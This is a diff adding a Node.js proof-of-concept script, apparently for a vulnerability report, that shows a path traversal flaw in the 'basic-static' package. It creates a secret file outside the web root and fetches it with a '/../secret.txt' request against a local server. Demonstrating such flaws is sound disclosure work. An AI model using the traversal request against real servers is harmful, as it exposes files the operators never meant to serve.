@@ -1,0 +1,32 @@
+```javascript
+const fs = require('fs');
+const path = require('path');
+const http = require('http');
+const basicStatic = require('basic-static');
+
+// Public web root the server is supposed to be confined to.
+const rootDir = path.join(__dirname, 'public');
+fs.mkdirSync(rootDir, { recursive: true });
+
+// A secret file living OUTSIDE the web root that must never be served.
+const secretPath = path.join(__dirname, 'secret.txt');
+fs.writeFileSync(secretPath, 'TOP SECRET DATA - should not be served\n');
+
+// basic-static builds the file path as path.join(rootDir, url.parse(req.url).pathname)
+// with no check that the result stays inside rootDir, so "../" traversal escapes it.
+const server = http.createServer(basicStatic({ rootDir })).listen(0, () => {
+  const port = server.address().port;
+  const req = http.request({ host: 'localhost', port, path: '/../secret.txt' }, (res) => {
+    let body = '';
+    res.on('data', (chunk) => (body += chunk));
+    res.on('end', () => {
+      console.log('Status:', res.statusCode);
+      console.log('Body:', body); // prints the secret file content, proving the traversal
+      server.close();
+      fs.unlinkSync(secretPath);
+      fs.rmdirSync(rootDir);
+    });
+  });
+  req.end();
+});
+```
